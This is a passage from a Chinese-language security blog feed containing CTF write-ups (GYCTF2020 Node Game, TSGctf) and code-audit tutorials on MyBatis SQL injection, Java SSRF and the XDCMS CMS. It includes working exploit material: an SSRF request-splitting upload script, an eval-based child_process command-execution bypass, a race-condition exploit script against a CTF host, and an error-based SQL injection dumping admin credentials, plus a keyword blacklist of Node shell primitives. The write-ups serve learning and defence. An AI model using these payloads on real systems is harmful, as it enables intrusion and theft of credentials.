req.files[0].mimetype +”/“;</td></tr><tr><td></td><td>var file_name = req.files[0].originalname</td></tr><tr><td></td><td>var dir_file = __dirname + file_path + file_name</td></tr><tr><td></td><td>if(!fs.existsSync(__dirname + file_path)){</td></tr><tr><td></td><td>try {</td></tr><tr><td></td><td>fs.mkdirSync(__dirname + file_path)</td></tr><tr><td></td><td>} catch (error) {</td></tr><tr><td></td><td>obj.msg = “file type error”;</td></tr><tr><td></td><td>res.send(JSON.stringify(obj));</td></tr><tr><td></td><td>return</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>try {</td></tr><tr><td></td><td>fs.writeFileSync(dir_file,data)</td></tr><tr><td></td><td>obj = {</td></tr><tr><td></td><td>msg: ‘upload success’,</td></tr><tr><td></td><td>filename: file_path + file_name</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>} catch (error) {</td></tr><tr><td></td><td>obj.msg = ‘upload failed’;</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>res.send(JSON.stringify(obj));</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>})</td></tr><tr><td></td><td>})</td></tr><tr><td></td><td></td></tr><tr><td></td><td>app.get(‘/source’, function(req, res) {</td></tr><tr><td></td><td>res.sendFile(path.join(__dirname + ‘/template/source.txt’));</td></tr><tr><td></td><td>});</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td>app.get(‘/core’, function(req, res) {</td></tr><tr><td></td><td>var q = req.query.q;</td></tr><tr><td></td><td>var resp = “”;</td></tr><tr><td></td><td>if (q) {</td></tr><tr><td></td><td>var url = ‘<a href="http://localhost:8081/source?&#39;">http://localhost:8081/source?&#39;</a> + q</td></tr><tr><td></td><td>console.log(url)</td></tr><tr><td></td><td>var trigger = blacklist(url);</td></tr><tr><td></td><td>if (trigger === true) {</td></tr><tr><td></td><td>res.send(“<p>error occurs!</p>“);</td></tr><tr><td></td><td>} else {</td></tr><tr><td></td><td>try {</td></tr><tr><td></td><td>http.get(url, function(resp) {</td></tr><tr><td></td><td>resp.setEncoding(‘utf8’);</td></tr><tr><td></td><td>resp.on(‘error’, function(err) {</td></tr><tr><td></td><td>if (err.code === “ECONNRESET”) {</td></tr><tr><td></td><td>console.log(“Timeout occurs”);</td></tr><tr><td></td><td>return;</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>});</td></tr><tr><td></td><td></td></tr><tr><td></td><td>resp.on(‘data’, function(chunk) {</td></tr><tr><td></td><td>try {</td></tr><tr><td></td><td>resps = chunk.toString();</td></tr><tr><td></td><td>res.send(resps);</td></tr><tr><td></td><td>}catch (e) {</td></tr><tr><td></td><td>res.send(e.message);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td></td></tr><tr><td></td><td>}).on(‘error’, (e) =&gt; {</td></tr><tr><td></td><td>res.send(e.message);});</td></tr><tr><td></td><td>});</td></tr><tr><td></td><td>} catch (error) {</td></tr><tr><td></td><td>console.log(error);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>} else {</td></tr><tr><td></td><td>res.send(“search param ‘q’ missing!”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>})</td></tr><tr><td></td><td></td></tr><tr><td></td><td>function blacklist(url) {</td></tr><tr><td></td><td>var evilwords = [“global”, “process”,”mainModule”,”require”,”root”,”child_process”,”exec”,”&quot;“,”‘“,”!”];</td></tr><tr><td></td><td>var arrayLen = evilwords.length;</td></tr><tr><td></td><td>for (var i = 0; i &lt; arrayLen; i++) {</td></tr><tr><td></td><td>const trigger = url.includes(evilwords[i]);</td></tr><tr><td></td><td>if (trigger === true) {</td></tr><tr><td></td><td>return true</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td></td></tr><tr><td></td><td>var server = app.listen(8081, function() {</td></tr><tr><td></td><td>var host = server.address().address</td></tr><tr><td></td><td>var port = server.address().port</td></tr><tr><td></td><td>console.log(“Example app listening at http://%s:%s”, host, port)</td></tr><tr><td></td><td>})</td></tr><tr><td></td><td></td></tr></tbody></table><p>可以看见这题有SSRF和任意文件上传</p><pre><code class="javascript">app.get(&#39;/&#39;, function(req, res) &#123;    var action = req.query.action?req.query.action:&quot;index&quot;;    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;        res.send(&quot;Errrrr, You have been Blocked&quot;);    &#125;    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);    var html = pug.renderFile(file);    res.send(html);&#125;);</code></pre><p>看到首页接受了一个action参数，会将我们上传到/template/目录下的文件pug渲染。并且返回值。这样的话我们思路大致就清晰了：<br> 还是通过core进行ssrf并伪造文件上传的http包访问到/flag。之后直接首页文件包含触发渲染，就可以访问到内容。</p><p>这里是构造头：</p><pre><code class="cpp">Content-Type: /../template（因为var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;）Content-Length:292Connection:keep-alive</code></pre><p>然后用一下网上的payload：（写不来呜呜）</p><p><code>import urllib.parse</code></p><p><code>import requests</code></p><p><code>payload = &#39;&#39;&#39; HTTP/1.1</code></p><p><code>POST /file_upload HTTP/1.1</code></p><p><code>Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</code></p><p><code>Content-Length: 291</code></p><p><code>----------------------------919695033422425209299810</code></p><p><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;abc.pug&quot;</code></p><p><code>Content-Type: ../template</code></p><p><code>doctype html</code></p><p><code>html</code></p><p> <code>head</code></p><p>  <code>style</code></p><p>   <code>include ../../../../../../../flag.txt</code></p><p><code>----------------------------919695033422425209299810--</code></p><p><code>GET /flag HTTP/1.1</code></p><p><code>x:&#39;&#39;&#39;</code></p><p><code>payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</code></p><p><code>payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</code></p><p><code>r = requests.get(&#39;http://07a0e2fe-ea38-49d6-8b00-b7e3261e9171.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))</code></p><p><code>print(r.text)</code></p><p>访问/?action=abc得到flag</p><p>bypass命令执行<br>出题人writeup<br><code>https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-gamev</code><br>是通过对参数URL编码绕过。<br>当然还能通过字符串拼接的方式绕过</p><pre><code>-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;whoami&#39;).toString()&quot;)-return x</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GYCTF2020-Node-Game&quot;&gt;&lt;a href=&quot;#GYCTF2020-Node-Game&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]Node Game&quot;&gt;&lt;/a&gt;[GYCTF2020]Node Game&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%BA%8C)/"/>
    <id>http://yoursite.com/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%BA%8C)/</id>
    <published>2020-07-26T08:33:28.658Z</published>
    <updated>2020-07-26T08:33:28.659Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java代码审计入门-二"><a href="#Java代码审计入门-二" class="headerlink" title="Java代码审计入门(二)"></a>Java代码审计入门(二)</h1><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><p>基础篇提到的 <code>JEESNS</code> 用的就是 <code>MyBatis</code>，略过介绍。</p><p><code>MyBatis</code> 使用内联参数 <code>$&#123;example&#125;</code> 或 <code>#&#123;example&#125;</code>，将查询的属性和参数做绑定，如下：</p><p>${}</p><pre><code>&lt;select id=&quot;selectStudentByStuId&quot; resultMap=&quot;studentMap&quot;&gt;    SELECT *    FROM student    WHERE stu_id = $&#123;stuId&#125;&lt;/select&gt;</code></pre><p>#{}</p><pre><code>&lt;select id=&quot;selectStudentByStuId&quot; resultMap=&quot;studentMap&quot;&gt;    SELECT *    FROM student    WHERE stu_id = #&#123;stuId&#125;&lt;/select&gt;</code></pre><p>两种方式有什么区别呢？接着看。</p><h2 id="（不安全的写法）"><a href="#（不安全的写法）" class="headerlink" title="${} （不安全的写法）"></a>${} <em>（不安全的写法）</em></h2><p>使用 <code>$&#123;foo&#125;</code> 这样格式的传入参数会直接参与SQL编译，类似字符串拼接的效果，是存在SQL注入漏洞的。所以一般情况下，不会用这种方式绑定参数。</p><h2 id=""><a href="#" class="headerlink" title="#{}"></a>#{}</h2><p>使用 <code>#&#123;&#125;</code> 做参数绑定时， <code>MyBatis</code> 会将SQL语句进行预编译，避免SQL注入的问题。</p><p><code>MyBatis</code> 预编译模式的实现，在底层同样是依赖于 <code>java.sql.PreparedStatement</code>，所以 <code>PreparedStatement</code> 存在的问题，这里也会存在。</p><p><code>ORDER BY</code> 只能通过 <code>$&#123;&#125;</code> 传递。为了避免SQL注入，需要手动过滤，或者在SQL里硬编码 <code>ORDER BY</code> 的字段名。</p><p>此外，还有一种情况 —— <code>LIKE</code> 模糊查询。</p><p>看下面这个写法：</p><pre><code>&lt;select id=&quot;selectStudentByFuzzyQuery&quot; resultMap=&quot;studentMap&quot;&gt;    SELECT *    FROM student    WHERE student.stu_name            LIKE &#39;%#&#123;stuName&#125;%&#39;&lt;/select&gt;</code></pre><p>在这里，<code>MyBatis</code> 会把 <code>%#&#123;stuName&#125;%</code> 作为要查询的参数，数据库会执行 <code>SELECT * FROM student WHERE student.stu_name LIKE &#39;%#&#123;stuName&#125;%&#39;</code>，导致查询失败，所以这里只能用 <code>$&#123;&#125;</code> 的方式传入。而如果用 <code>$&#123;&#125;</code> 又存在SQL注入的风险，怎么办呢？</p><p>最好的方法是，使用数据库自带的 <code>CONCAT</code> ，将 <code>%</code> 和我们用 <code>#&#123;&#125;</code> 传入参数连接起来，这样就既不存在注入的问题，也能满足需求啦。示例：</p><pre><code>&lt;select id=&quot;selectStudentByFuzzyQuery&quot; resultMap=&quot;studentMap&quot;&gt;    SELECT *    FROM student    WHERE student.stu_name            LIKE CONCAT(&#39;%&#39;,#&#123;stuName&#125;,&#39;%&#39;)&lt;/select&gt;</code></pre><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h1 id="发起请求的流程"><a href="#发起请求的流程" class="headerlink" title="发起请求的流程"></a>发起请求的流程</h1><p>构造一个简单的 <code>http</code> 请求：</p><pre><code>try &#123;    URL u = new URL(url);    URLConnection urlConnection = u.openConnection();    InputStream inputStream = urlConnection.getInputStream();    //...&#125; catch (IOException e) &#123;    e.printStackTrace();&#125;</code></pre><p>简述下这个过程，首先，构造一个 <code>URL</code> 对象，调用 <code>url</code> 的 <code>openConnection()</code> 方法来获取一个 <code>URLConnection</code> 实例，然后再调 <code>getInputStream()</code> 拿到 <code>InputStream</code>，也就是请求的响应流。之后，再做我们想要的其它事情。</p><p>在这个过程中，如果 <code>URL</code> 是可控的，那么就会存在 <code>SSRF</code> 漏洞。</p><p>这是 <code>JDK</code> 自带的类，它的 <code>read()</code> 方法，用来加载图片。它可以传入一个 <code>URL</code> 对象，且没有协议限制，如下：</p><p>ImageIO.java:1386</p><pre><code>public static BufferedImage read(URL input) throws IOException &#123;    if (input == null) &#123;        throw new IllegalArgumentException(&quot;input == null!&quot;);    &#125;    InputStream istream = null;    try &#123;        istream = input.openStream();    &#125; catch (IOException e) &#123;        throw new IIOException(&quot;Can&#39;t get input stream from URL!&quot;, e);    &#125;    ImageInputStream stream = createImageInputStream(istream);    BufferedImage bi;    try &#123;        bi = read(stream);        if (bi == null) &#123;            stream.close();        &#125;    &#125; finally &#123;        istream.close();    &#125;    return bi;&#125;</code></pre><p><strong>如果服务器在加载图片时，<code>URL</code> 是用户可控的，那么就会存在 <code>SSRF</code> 漏洞。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java代码审计入门-二&quot;&gt;&lt;a href=&quot;#Java代码审计入门-二&quot; class=&quot;headerlink&quot; title=&quot;Java代码审计入门(二)&quot;&gt;&lt;/a&gt;Java代码审计入门(二)&lt;/h1&gt;&lt;h1 id=&quot;MyBatis&quot;&gt;&lt;a href=&quot;#MyBa
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
    <id>http://yoursite.com/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%B8%80)/</id>
    <published>2020-07-26T04:03:54.716Z</published>
    <updated>2020-07-26T04:03:54.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java代码审计入门-一"><a href="#Java代码审计入门-一" class="headerlink" title="Java代码审计入门(一)"></a>Java代码审计入门(一)</h1><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><p>目前，<code>JDK</code>已经出到<code>11</code>了，<code>JDK</code>每个版本都会有些新特性出来。很多情况下<code>JDK</code>并不向下兼容，导致一些软件在较新的<code>JDK</code>中无法正常运行，所以推荐用现在比较主流的<code>JDK8</code>。而且有些漏洞需要在低版本的<code>JDK</code>上才能复现出来，比如反序列化用到的<code>JNDI Bean Property</code>类型的<code>Gadget</code>，需要在小于<code>JDK8_113</code>的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726100447203.png" alt="image-20200726100447203"></p><p>我们在审计一个项目的时候，最开始应该是先熟悉项目的结构，了解项目的技术栈。</p><p>本篇，我会引入一个开源的 Java Web 项目，通过实例分析 Java Web 的项目结构，常用的 MVC 模式。</p><h1 id="JEESNS"><a href="#JEESNS" class="headerlink" title="JEESNS"></a>JEESNS</h1><p><a href="https://github.com/zchuanzhao/jeesns">JEESNS</a>，是一款基于 JAVA 企业级平台研发的社交管理系统，在 github 上有 200+ star，在开源的 Java Web 项目中算是还不错的了。</p><p>项目地址： <a href="https://github.com/zchuanzhao/jeesns">https://github.com/zchuanzhao/jeesns</a></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726101755011.png" alt="image-20200726101755011"></p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>在项目根目录吓，有一个pom.xml的文件，这个文件的存在，表面项目用Maven构建。它可以管理项目源码、配置文件，不过最大的用处还是处理<strong>项目的依赖关系</strong>。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726102705695.png" alt="image-20200726102705695"></p><p>红框的 ① 处，描述了这个项目的开发组织，项目名称，项目版本。</p><p>② 处，用的是<code>modules</code>标签，说明这是一个多模块项目。在左边的导航栏，可以看到确实有许多子模块。</p><blockquote><p>多模块项目是为了在项目开发中便于后期维护，所以采用分层开发的方法，这样各个模块的职责会比较的明确，维护起来相对容易。在打包时，只要对父模块打包即可，子模块会自动合并进来。</p></blockquote><p>③ 处，是 maven 在构建时相关的配置，这里用了一个 compiler 插件，表示源码用的是<code>1.7</code>的<code>JDK</code>并且生成的目标字节码文件也要是<code>1.7</code>的。</p><p>随便点一个<code>pom.xml</code>，它和根目录下的<code>pom.xml</code>有所不同，多了一个<code>&lt;parent&gt;</code>标签，和<code>dependencies</code>。</p><p><code>&lt;parent&gt;</code>标签，表示这个子模块，将上级的<code>jeesns</code>项目作父模块。</p><p><code>dependencies</code>，描述了这个模块的依赖关系。当前的<code>web</code>模块依赖于子模块<code>core</code>,<code>model</code>,<code>service</code>,<code>common</code>。而子模块<code>core</code>里，依赖于许多的第三方库，包括<code>Spring</code>、<code>MyBatis</code>、<code>apache-commons</code>等。它们都继承了上级的<code>jeesns</code>父模块，在逻辑上同属一个项目。</p><h3 id="jeesns-core"><a href="#jeesns-core" class="headerlink" title="jeesns-core"></a>jeesns-core</h3><p>主要使用了 <code>SSM框架</code> (Spring+SpringMVC+MyBatis)， <code>freemarker</code> 模板引擎，支持 <code>MySQL</code> 数据库，使用 <code>c3p0</code> 连接池，<code>jackson</code> 处理 <code>json</code> 数据，<code>hibernate-validator</code> 对用户传来的请求数据进行有效性验证，还有一些 <code>apache</code> 提供的工具类。</p><p>好像我下载的项目这个模块不一样，先看看下面。</p><h3 id="jeesns-dao"><a href="#jeesns-dao" class="headerlink" title="jeesns-dao"></a>jeesns-dao</h3><p><code>DAO</code> 层，负责数据持久化，通俗点说就是用来和数据库交互，读写数据的模块。</p><p>前面有说到，<code>JEESNS</code> 用了 <code>MyBatis</code> 作为数据持久化框架。<code>MyBatis</code> 属于半自动 <code>ORM</code> ，它会帮我们自动将数据查询结果映射到对象，但是数据查询的 <code>SQL</code> 语句还是要我们自己手写，这点和其它的 <code>ORM</code> 明显的不一样。</p><p><code>MyBatis</code> 的使用方式主要有两种，一种是使用<code>注解</code>，直接将<code>SQL</code>语句和<code>方法</code>绑定在一起，像下面这样：</p><pre><code>package org.mybatis.example;public interface BlogMapper &#123;  @Select(&quot;SELECT * FROM blog WHERE id = #&#123;id&#125;&quot;)  Blog selectBlog(int id);&#125;</code></pre><p>这种方式，适合简单的<code>SQL</code>语句，一旦语句长了，注释会变得复杂混乱，维护起来很麻烦，所以它只适合小项目（小项目用的也不多）。</p><p>用的最多的是第二种——<code>XML</code>配置，将<code>SQL</code>语句和<code>Java</code>代码分离，有独立的<code>xml</code>文件，描述某个方法会和某个<code>SQL</code>语句绑定。</p><p>这是网上的图，我找不到原来的项目。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726103908328.png" alt="image-20200726103908328"></p><p>如图接口在目录中都有对应的xml。接口中的方法和xml中id相同的sql语句关联。</p><p>例如，<code>IArticleCateDao</code> 的 <code>list()</code>方法被调用，那么就会找到 <code>ArticleCateMapper.xml</code>中 <code>id</code>等于 <code>list</code> 的方法，执行它的 <code>SQL</code>，然后根据 <code>resultMap</code> 描述的 <em>字段-属性</em> 映射关系，返回相应的实例对象。</p><p>这里的 <code>resultMap</code> 具体如下：</p><pre><code>&lt;resultMap id=&quot;ArticleCateResult&quot; type=&quot;ArticleCate&quot;&gt;    &lt;id column=&quot;id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;id&quot; /&gt;    &lt;result column=&quot;fid&quot; jdbcType=&quot;INTEGER&quot; property=&quot;fid&quot; /&gt;    &lt;result column=&quot;name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;name&quot; /&gt;    &lt;result column=&quot;status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;status&quot; /&gt;    &lt;result column=&quot;sort&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sort&quot; /&gt;&lt;/resultMap&gt;</code></pre><p>其中，<code>id</code>属性是该映射的名称，<code>type</code>属性代表映射的类。里面有 <code>5</code> 个子元素，<code>id</code>元素映射到<code>ArticleCate</code>的<code>id</code>属性。其它四个<code>result</code>元素中的<code>column</code>属性会映射到对应的<code>property</code>属性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java代码审计入门-一&quot;&gt;&lt;a href=&quot;#Java代码审计入门-一&quot; class=&quot;headerlink&quot; title=&quot;Java代码审计入门(一)&quot;&gt;&lt;/a&gt;Java代码审计入门(一)&lt;/h1&gt;&lt;h2 id=&quot;基本环境&quot;&gt;&lt;a href=&quot;#基本环境&quot; c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/07/14/TSGctf%20web/"/>
    <id>http://yoursite.com/2020/07/14/TSGctf%20web/</id>
    <published>2020-07-14T01:59:06.648Z</published>
    <updated>2020-07-14T01:59:06.648Z</updated>
    
    <content type="html"><![CDATA[<p>TSGctf web</p><p>Code：</p><pre><code>const fastify = require(&#39;fastify&#39;);const nunjucks = require(&#39;nunjucks&#39;);const crypto = require(&#39;crypto&#39;);const converters = &#123;&#125;;const flagConverter = (input, callback) =&gt; &#123;  const flag = &#39;*** CENSORED ***&#39;;  callback(null, flag);&#125;;const base64Converter = (input, callback) =&gt; &#123;  try &#123;    const result = Buffer.from(input).toString(&#39;base64&#39;);    callback(null, result)  &#125; catch (error) &#123;    callback(error);  &#125;&#125;;const scryptConverter = (input, callback) =&gt; &#123;  crypto.scrypt(input, &#39;I like sugar&#39;, 64, (error, key) =&gt; &#123;    if (error) &#123;      callback(error);    &#125; else &#123;      callback(null, key.toString(&#39;hex&#39;));    &#125;  &#125;);&#125;;const app = fastify();app.register(require(&#39;point-of-view&#39;), &#123;engine: &#123;nunjucks&#125;&#125;);app.register(require(&#39;fastify-formbody&#39;));app.register(require(&#39;fastify-cookie&#39;));app.register(require(&#39;fastify-session&#39;), &#123;secret: Math.random().toString(2), cookie: &#123;secure: false&#125;&#125;);app.get(&#39;/&#39;, async (request, reply) =&gt; &#123;  reply.view(&#39;index.html&#39;, &#123;sessionId: request.session.sessionId&#125;);&#125;);app.post(&#39;/&#39;, async (request, reply) =&gt; &#123;  if (request.body.converter.match(/[FLAG]/)) &#123;    throw new Error(&quot;Don&#39;t be evil :)&quot;);  &#125;  if (request.body.input.length &lt; 10) &#123;    throw new Error(&#39;Too short :(&#39;);  &#125;  if (request.body.input.length &gt; 1000) &#123;    throw new Error(&#39;Too long :(&#39;);  &#125;  converters[&#39;base64&#39;] = base64Converter;  converters[&#39;scrypt&#39;] = scryptConverter;  converters[`FLAG_$&#123;request.session.sessionId&#125;`] = flagConverter;  const result = await new Promise((resolve, reject) =&gt; &#123;    converters[request.body.converter](request.body.input, (error, result) =&gt; &#123;      if (error) &#123;        reject(error);      &#125; else &#123;        resolve(result);      &#125;    &#125;);  &#125;);  reply.view(&#39;index.html&#39;, &#123;    input: request.body.input,    result,    sessionId: request.session.sessionId,  &#125;);&#125;);app.setErrorHandler((error, request, reply) =&gt; &#123;  reply.view(&#39;index.html&#39;, &#123;error, sessionId: request.session.sessionId&#125;);&#125;);app.listen(59101, &#39;0.0.0.0&#39;);</code></pre><p>I never expected to be able to read JS, but because of the foundation of learning other languages, I was able to understand this simple code, so I wanted others to try it out.</p><p>1.By reading the source code, we can easily find several key points.</p><pre><code>const flagConverter = (input, callback) =&gt; &#123;  const flag = &#39;*** CENSORED ***&#39;;  callback(null, flag);&#125;;</code></pre><pre><code>app.post(&#39;/&#39;, async (request, reply) =&gt; &#123;  if (request.body.converter.match(/[FLAG]/)) &#123;    throw new Error(&quot;Don&#39;t be evil :)&quot;);  &#125;</code></pre><pre><code> converters[&#39;base64&#39;] = base64Converter;  converters[&#39;scrypt&#39;] = scryptConverter;  converters[`FLAG_$&#123;request.session.sessionId&#125;`] = flagConverter;</code></pre><p>So we need to bypass FLAG filtering. But I know little about JS. I didn’t know until after the game:</p><ol><li>Objects have multiple intrinsic JS function, one of them can be used to spit out the flag in errors :)</li></ol><pre><code>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__</code></pre><p>The defineSetter function of any object is way to do extra things in callback when a values are assigned to its keys.</p><pre><code>var o = &#123;&#125;;o.__defineSetter__(&#39;key&#39;, function(value) &#123; //we access value in callback &#125;);</code></pre><p>So following code</p><pre><code>converters[request.body.converter](request.body.input, (error, result) =&gt; &#123;      if (error) &#123;        reject(error);      &#125; else &#123;        resolve(result);      &#125;    &#125;);</code></pre><p>with <code>request.body.converter = __defineSetter__</code> and <code>request.body.input = FLAG_sessionId</code></p><p>will assign following callback for whenever converter object gets key <code>FLAG_sessionId</code> assigned a value.</p><pre><code>(error, result) =&gt; &#123;      if (error) &#123;        reject(error);      &#125; else &#123;        resolve(result);      &#125;    &#125;);</code></pre><p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p><p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p><p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p><p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p><p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p><p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p><pre><code class="python">import threadingimport requestsimport time cookie = &#123;&quot;sessionId&quot; : &quot;HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa.YTlYOIhk52YHs3NzP%2FFPuu6y7MK1ev6uX21jHbgxMXE&quot;&#125;def sendPayload():        r = requests.post(&quot;http://34.85.124.174:59101&quot;,json=       &#123;&quot;converter&quot;:&quot;__defineSetter__&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;&#125;,cookies=cookie)        print(r.text) threading.Thread(target=sendPayload).start()time.sleep(1)requests.post(&quot;http://34.85.124.174:59101&quot;,json=&#123;&quot;converter&quot;:&quot;base64&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;&#125;,cookies=cookie)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TSGctf web&lt;/p&gt;
&lt;p&gt;Code：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const fastify = require(&amp;#39;fastify&amp;#39;);
const nunjucks = require(&amp;#39;nunjucks&amp;#39;);
const cr
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-06-23T03:15:55.378Z</published>
    <updated>2020-06-23T03:15:55.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计练习（一）"><a href="#代码审计练习（一）" class="headerlink" title="代码审计练习（一）"></a>代码审计练习（一）</h1><h2 id="XDCMS"><a href="#XDCMS" class="headerlink" title="XDCMS"></a>XDCMS</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623103752008.png" alt="image-20200623103752008"></p><p>先打开index.php，有代码知先坚持config.inc.php是否存在不存在则跳转到安装页面。打开commmon.inc.php看一下。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104149304.png" alt="image-20200623104149304"></p><p>再打开xdcms.inc.php，有提示打开fun.inc.php，在该文件中，对接收参数使用safe_html()和save_replace()函数进行过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104541913.png" alt="image-20200623104541913"></p><p>可以看到这里进行了过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104616205.png" alt="image-20200623104616205"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104648257.png" alt="image-20200623104648257"></p><p>在global.inc.php文件中知对get进行了过滤没有进行POST的过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105333159.png" alt="image-20200623105333159"></p><p>fileds没有过滤</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105453088.png" alt="image-20200623105453088"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105635301.png" alt="image-20200623105635301"></p><p>在主页面进行会员注册。数据库报错,但是信息还是可以提交到数据库，会员注册成功，说明没有对提交的特殊字符进行过滤。由数据库报错信息可知，提交的信息是提交到表c_member中。</p><p>在源码中查找query</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623110247381.png" alt="image-20200623110247381"></p><p>考虑到使用数据库报错进行注入，利用代码如下：</p><p><code>update c_member set truename=&#39;simple&#39;,eamil=&#39;3456&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#where 